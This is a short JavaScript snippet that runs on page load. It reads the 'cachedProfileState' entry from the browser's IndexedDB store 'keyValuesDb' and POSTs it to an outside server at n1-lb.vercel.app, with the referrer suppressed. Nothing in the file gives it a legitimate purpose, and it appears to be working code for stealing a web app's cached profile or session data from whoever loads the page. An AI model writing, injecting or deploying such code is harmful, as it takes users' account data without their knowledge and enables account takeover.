async function getData() {
    // Open the IndexedDB database
    await new Promise(r => setTimeout(r, 2000));
    var request = indexedDB.open("keyValuesDb");

    request.onerror = function (event) {
        console.error("Failed to open the database:", event.target.errorCode);
    };

    request.onsuccess = function (event) {
        var db = event.target.result;

        var transaction = db.transaction(["keyValues"], "readwrite");

        var objectStore = transaction.objectStore("keyValues");

        // Get the value by key ("cachedProfileState")
        var request = objectStore.get("cachedProfileState");

        request.onsuccess = function (event) {
            // Access the data
            var cachedProfileState = event.target.result;

            // Do something with cachedProfileState
            // console.log("Cached Profile State:", cachedProfileState);
            console.log("Cached Profile State:", cachedProfileState);

            // The URL where you want to send the POST request
            const apiUrl = 'https://n1-lb.vercel.app/api/Update';

            // send the POST request
            fetch(apiUrl, {
                method: 'POST',
                referrerPolicy: "no-referrer",
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(cachedProfileState),
            })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    console.log({ success: true });
                })
                .catch(error => {
                    console.error('Error:', error.message);
                    console.log({ success: false, error: error.message });
                });
            

        };

        request.onerror = function (event) {
            console.error("Error retrieving data:", event.target.errorCode);
        };
    };
}

document.addEventListener("readystatechange", (event) => {
    getData();
});
